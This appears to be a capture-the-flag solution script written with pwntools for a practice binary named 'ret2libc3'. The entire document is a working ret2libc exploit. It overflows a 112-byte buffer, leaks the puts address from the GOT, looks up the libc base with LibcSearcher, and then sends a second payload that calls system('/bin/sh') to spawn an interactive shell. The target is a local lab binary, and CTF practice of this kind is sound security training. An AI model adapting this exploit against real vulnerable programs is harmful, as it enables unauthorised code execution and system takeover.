#!/usr/bin/env python
from pwn import *
from LibcSearcher import *
elf=ELF('./ret2libc3')
p=process('./ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr = elf.symbols['_start']
#gdb.attach(p)
payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)
p.sendlineafter("!?",payload1)

a = p.recv(4)

puts_addr=u32(a)

print(puts_addr)
libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump("puts")
system_addr=libcbase+libc.dump("system")
binsh_addr=libcbase+libc.dump("str_bin_sh")
payload2=b'A'*112+p32(system_addr)+p32(1234)+p32(binsh_addr)
print(binsh_addr)
p.sendlineafter("!?",payload2)
p.interactive()